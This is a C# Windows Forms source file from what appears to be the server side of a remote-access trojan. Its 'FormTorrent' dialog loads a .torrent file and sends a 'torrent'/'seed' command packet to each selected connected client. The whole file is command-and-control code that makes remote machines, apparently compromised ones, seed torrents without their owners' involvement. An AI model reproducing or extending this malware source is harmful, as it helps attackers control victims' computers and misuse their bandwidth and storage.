using Server.MessagePack;
using Server.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormTorrent : Form
    {
        private bool isOk = false;
        public FormTorrent()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "(*.torrent)|*.torrent";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog.FileName;
                isOk = true;
            }
            else
            {
                textBox1.Text = "";
                isOk = false;
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (!isOk) return;
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "torrent";
            msgpack.ForcePathObject("Option").AsString = "seed";
            msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
            foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
            {
                Clients client = (Clients)itm.Tag;
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            this.Close();
        }
    }
}
